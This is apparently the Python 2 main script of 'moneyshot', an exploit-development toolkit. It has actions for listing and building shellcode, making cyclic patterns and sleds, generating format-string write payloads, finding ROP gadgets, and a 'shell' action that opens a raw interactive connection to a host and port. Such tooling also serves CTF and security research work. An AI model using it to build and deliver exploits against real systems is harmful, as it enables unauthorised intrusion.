#!/usr/bin/python

import sys
import colors
import outputter
import codelibrary
import codeparameters
import lolsled
import builder
import pattern
import ezrop
import pprint
import re
import socket
import termios, tty, select, os

from lib.libformatstr import FormatStr

def banner():
	ms_fancy  = colors.bold() + colors.fg('yellow') + "$$$ " + colors.end()
	ms_fancy += colors.bold() + "moneyshot" + colors.end()
	ms_fancy += " by "
	ms_fancy += colors.bold() + "blasty"  + colors.end()
	ms_fancy += colors.bold() + colors.fg('yellow') + " $$$" + colors.end()

	sys.stderr.write("\n " + ms_fancy + "\n\n")

def usage():
	print ""
	print "  usage: moneyshot <action> [options]\n"
	print "  actions:"
	print "    * list     - list shellcodes"
	print "    * build    - build shellcodes"
	print "    * pattern  - build patterns"
	print "    * lolsled  - build a lolsled"
	print "    * format   - format input"
	print "    * fmt      - formatstring helper"
	print "    * rop      - ROP helper\n"

def warning(instr):
	print "  " + colors.fg('red') + colors.bold() + "!!" + colors.end() + " " + instr

def action_list(path = ""):
	codes = codelibrary.find_codes(path)
	print ""
	codelibrary.print_codes(codes)

def action_format(outformat):
	data = sys.stdin.readlines()
	data = ''.join(data)

	print outputter.outfunc[ outformat ](data, fancy = False),

if len(sys.argv) == 1:
	banner()
	usage()
	exit()

action = sys.argv[1]

codelibrary.load_codes(sys.path[0] + "/codes")

if action == "list":
	if len(sys.argv) == 3:
		action_list(sys.argv[2])
	else:
		action_list()

elif action == "fmt":
	if len(sys.argv) < 3:
		print "usage: moneyshot fmt <primitives>\n"
		print "availables primitives:"
		print "  * p:NNNN      - parameter position where user-controlled input starts"
		print "  * n:NNNN      - specify bytes already written (defaults to 0)"
		print "  * w:XXXX=YYYY - write value YYYY to address XXXX\n"

	p = FormatStr()

	param_pos = 0
	already_written = 0

	for param in  sys.argv[2:]:
		if param[0:2] == "w:":
			(addr,val) = param[2:].split("=")
			p[ int(addr, 0) ] = int(val, 0);
		elif param[0:2] == "p:":
			param_pos = int(param[2:], 0)
		elif param[0:2] == "n:":
			already_written = int(param[2:], 0)
		else:
			print "UNKNOWN FMT specifier: '%s'" % (param)
			exit()

	sys.stdout.write( p.payload(param_pos, start_len=already_written) )

elif action == "rop":
	if len(sys.argv) < 4:
		print "usage: moneyshot rop <binary> <pattern/code>"
	else:
		ezrop.do_ropfind(sys.argv[2], " ".join(sys.argv[3:]))

elif action == "lolsled":
	lolsled.main(sys.argv[2:])

elif action == "pattern":
	pattern.main(sys.argv[2:])

elif action == "shell":
	if (len(sys.argv) != 4):
		print "usage: moneyshot shell <host> <port>"
		exit()	

	target = (sys.argv[2], int(sys.argv[3]))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(target)

	old_settings = termios.tcgetattr(0)
	try:
		tty.setcbreak(0)
		c = True
		while c:
			for i in select.select([0, s.fileno()], [], [], 0)[0]:
				c = os.read(i, 1024)
				if c: os.write(s.fileno() if i == 0 else 1, c)
	except KeyboardInterrupt: pass
	finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

elif action == "format":
	if len(sys.argv) < 3:
		action_format("c")
	else:
		action_format(sys.argv[2])

elif action == "build":
	builder.main(sys.argv[2:])

else:
	banner()
	usage()
	exit()
